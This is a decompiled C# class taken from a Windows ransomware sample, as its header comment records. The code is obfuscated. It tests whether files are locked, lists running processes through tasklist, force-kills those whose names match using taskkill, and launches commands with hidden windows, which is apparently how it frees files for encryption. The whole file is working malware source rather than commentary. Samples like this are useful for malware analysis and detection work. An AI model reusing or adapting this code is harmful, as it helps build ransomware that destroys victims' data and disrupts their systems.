// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.MZxLtJzLRoIRU
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace MufMaOSvGyvz
{
  internal class MZxLtJzLRoIRU
  {
    public static readonly List<string> QufHrMMQEgM = new List<string>();
    public static readonly List<string> pbLugJQHtEkvAi = new List<string>();
    private static Func<string, string[]> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8;
    private static Func<string[], string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9;

    public static bool vtOeVWNQhPdxNt(string string_0)
    {
      FileStream fileStream = (FileStream) null;
      bool flag;
      try
      {
        fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      }
      catch (UnauthorizedAccessException ex1)
      {
        try
        {
          fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
        }
        catch (Exception ex2)
        {
          flag = true;
          goto label_8;
        }
      }
      catch (Exception ex)
      {
        flag = true;
        goto label_8;
      }
      finally
      {
        fileStream.Close();
      }
      flag = false;
label_8:
      return flag;
    }

    public static void RZJqgaZnLiq(string string_0)
    {
      Func<string, bool> func = (Func<string, bool>) null;
      MZxLtJzLRoIRU.WaYodAhqFAmW waYodAhqFamW = new MZxLtJzLRoIRU.WaYodAhqFAmW();
      waYodAhqFamW.dBjhKErYpbQ = string_0;
      try
      {
        string[] source1 = MZxLtJzLRoIRU.TRUYlwuenMOlx("tasklist", "/v /fo csv").Split(new string[1]
        {
          "\r\n"
        }, StringSplitOptions.None);
        if (func == null)
          func = new Func<string, bool>(waYodAhqFamW.\u003CKillproc\u003Eb__4);
        Func<string, bool> predicate = func;
        IEnumerable<string> source2 = ((IEnumerable<string>) source1).Where<string>(predicate);
        if (MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8 == null)
          MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8 = new Func<string, string[]>(MZxLtJzLRoIRU.\u003CKillproc\u003Eb__5);
        Func<string, string[]> anonymousMethodDelegate8 = MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8;
        IEnumerable<string[]> source3 = source2.Select<string, string[]>(anonymousMethodDelegate8);
        if (MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9 == null)
          MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9 = new Func<string[], string>(MZxLtJzLRoIRU.\u003CKillproc\u003Eb__6);
        Func<string[], string> anonymousMethodDelegate9 = MZxLtJzLRoIRU.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9;
        foreach (string str in source3.Select<string[], string>(anonymousMethodDelegate9).ToList<string>())
          MZxLtJzLRoIRU.TRUYlwuenMOlx("taskkill", "/f /pid " + str);
      }
      catch (Exception ex)
      {
      }
    }

    public static string TRUYlwuenMOlx(string string_0, string string_1)
    {
      string str;
      try
      {
        Process process = Process.Start(new ProcessStartInfo(string_0, string_1)
        {
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          StandardOutputEncoding = Encoding.GetEncoding("UTF-8"),
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = false,
          CreateNoWindow = true
        });
        string end1;
        using (StreamReader standardOutput = process.StandardOutput)
          end1 = standardOutput.ReadToEnd();
        string end2;
        using (StreamReader standardError = process.StandardError)
          end2 = standardError.ReadToEnd();
        process.WaitForExit();
        str = end2 + end1;
      }
      catch (Exception ex)
      {
        str = ex.Message + "\n<------------>\n" + ex.StackTrace;
      }
      return str;
    }

    private static string[] \u003CKillproc\u003Eb__5(string string_0) => string_0.Split(',');

    private static string \u003CKillproc\u003Eb__6(string[] string_0) => string_0[1].Replace("\"", "");

    private sealed class WaYodAhqFAmW
    {
      public string dBjhKErYpbQ;

      public bool \u003CKillproc\u003Eb__4(string string_0) => string_0.Contains(this.dBjhKErYpbQ);
    }
  }
}
